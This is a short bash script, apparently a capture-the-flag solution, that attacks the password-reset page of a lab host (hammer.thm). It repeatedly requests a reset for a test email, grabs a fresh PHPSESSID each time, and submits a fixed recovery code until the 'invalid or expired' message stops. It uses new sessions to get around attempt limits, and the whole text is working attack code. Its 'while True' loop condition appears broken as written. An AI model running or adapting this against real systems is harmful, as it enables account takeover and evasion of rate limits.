IP=10.82.129.124
while True
do
    response_get_cookie=$(curl -is "http://$IP:1337/reset_password.php" -X POST --data-raw 'email=tester@hammer.thm')
    phpsessid=$(echo "$response_get_cookie" | grep -i '^Set-Cookie:' | grep -o 'PHPSESSID=[^;]*' | cut -d= -f2)
    echo "$phpsessid"
    response=$(curl -is "http://$IP:1337/reset_password.php" -X POST -H "Cookie: PHPSESSID=$phpsessid" --data-raw 'recovery_code=1337&s=177')
    [[ "$response" == *"Invalid or expired recovery code!"* ]] || exit
done